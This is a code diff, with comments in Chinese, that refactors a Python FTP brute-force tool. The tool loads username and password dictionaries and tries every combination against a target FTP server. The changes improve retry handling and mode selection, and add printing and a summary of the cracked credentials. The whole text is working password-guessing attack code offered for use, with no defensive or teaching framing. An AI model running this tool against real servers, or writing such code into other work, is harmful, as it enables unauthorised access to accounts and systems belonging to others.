@@ -1,9 +1,11 @@
+#   -*- coding: utf-8 -*-
+# !/usr/bin/env python3.10
+
 from ftplib import FTP, error_perm
 from socket import timeout
 from time import sleep
 from os import path
 from threading import Thread
-from queue import Queue
 
 
 class FtpBruteForce:
@@ -14,6 +16,7 @@ class FtpBruteForce:
     进行登录尝试
     关闭连接
     """
+
     def __init__(self, server_address, user_dict_path, password_dict_path, server_port=21):
         """
         :param server_address: FTP服务器IPv4地址
@@ -79,9 +82,6 @@ class FtpBruteForce:
                     password = password.strip()
                     if password != "":
                         password_set.add(password)
-            # except EOFError:
-            #     self.stop(5)
-            #     self.reconnect()
         else:
             self.error_message("字典文件不存在")
             return None, None
@@ -90,63 +90,70 @@ class FtpBruteForce:
 
     def connection(self):
         while True:
-            # try:
             if self.attempted_times == 5:
                 self.error_message("已连接失败五次，正在尝试重新连接，请至少等待5秒...")
                 self.stop(self.attempted_times)
-                self.reconnect(connection=True)     # 当连接失败次数达到5次时，休眠5秒再重新连接
+                self.reconnect(connection=True)  # 当连接失败次数达到5次时，休眠5秒再重新连接
+            else:
+                try:
+                    reply = self.ftp.connect(self.server_address, self.server_port, timeout=10)
+                    if "220" in reply:
+                        print("\033[32m连接成功，FTP服务已就绪！\033[0m")
+                        break
+                except ConnectionRefusedError as connect_error:
+                    self.attempted_times += 1
+                    self.error_message(f"错误：{connect_error},连接被拒绝，服务可能未运行或已达到最大连接数量。")
+                    continue
+                except (TimeoutError, timeout) as timeout_error:
+                    self.attempted_times += 1
+                    self.error_message(f"错误：{timeout_error}，连接超时，请检查网络连接和FTP服务器是否正常运行。")
+                    continue
 
-            try:
-                reply = self.ftp.connect(self.server_address, self.server_port, timeout=10)
-                if "220" in reply:
-                    print("\033[32m连接成功，FTP服务已就绪！\033[0m")
-                    break
-            except ConnectionRefusedError as connect_error:
-                self.attempted_times += 1
-                self.error_message(f"错误：{connect_error},连接被拒绝，服务可能未运行或已达到最大连接数量。")
-                continue
-            except (TimeoutError, timeout) as timeout_error:
-                self.attempted_times += 1
-                self.error_message(f"错误：{timeout_error}，连接超时，请检查网络连接和FTP服务器是否正常运行。")
-                continue
-
-        self.attempted_times = 0    # 重置类中的重试计数器，使其能重新使用
+        self.attempted_times = 0  # 重置类中的重试计数器，使其能重新使用
 
     def brute(self, user_dict_tuples, password_tuples):
         """
         :param user_dict_tuples: 用户名字典元组
         :param password_tuples: 密码字典元组
         """
+        success_login: dict = dict()
+
         if len(user_dict_tuples) == 0 or len(password_tuples) == 0:
             self.error_message("用户名字典或密码字典为空，请先调用load_dict方法加载用户名和密码字典")
         else:
             while True:
                 # 爆破模式选择
-                mode = int(input("请输入登录模式（1.尝试字典中所有用户名和字典 2.爆破单个 0.退出）："))
-                if mode not in [0, 1, 2]:
+                try:
+                    mode = int(input("请输入登录模式（1.尝试字典中所有用户名和字典 2.爆破单个 0.退出）："))
+                    match mode:
+                        case 0:
+                            exit(0)
+                        case 1 | 2:
+                            break
+                        case _:
+                            self.error_message("输入的登录模式无效，请输入1或2")
+                            continue
+                except ValueError:
                     self.error_message("输入的登录模式无效，请输入1或2")
-                elif mode == 0:
-                    __import__("sys").exit(0)
-                else:
-                    break
+                    continue
 
-            success_login = dict()
             for user_index, user in enumerate(user_dict_tuples):
                 for password_index, password in enumerate(password_tuples):
                     self.attempted_times = 0  # 重置尝试计数器，针对每个用户名和密码组合
 
-                    while self.attempted_times < 6:     # 当登录超时计数器达到5次时，重新开始
+                    while self.attempted_times < 6:  # 当登录超时计数器达到5次时，重新开始
                         try:
                             replay = self.ftp.login(user, password)
                             if "230" in replay and mode == 1:
                                 print(f"\033[1;32m登录成功: 用户名：{user}, 密码：{password}\033[0m")
                                 success_login[user] = password
                                 self.ftp.close()
-                                self.reconnect(connection=True)
+                                self.connection()
                                 break
                             elif "230" in replay and mode == 2:
+                                print(f"\033[1;32m登录成功: 用户名：{user}, 密码：{password}\033[0m")
                                 self.ftp.close()
-                                __import__("sys").exit(0)
+                                exit(0)
                         except error_perm as error:
                             if "530 Permission denied" in str(error):
                                 self.error_message(f"用户名：{user} 密码：{password} 登录失败，FTP拒绝连接")
@@ -175,6 +182,9 @@ class FtpBruteForce:
                     else:
                         self.error_message(f"当前用户和密码组合尝试完毕，未找到有效登录信息")
 
+        print("以下为有效登录信息：")
+        for key, value in success_login.items():
+            print(f"用户名：{key} 密码：{value}")
+
     def __del__(self):
         self.ftp.close()
-        # self.reconnect(connection=True)
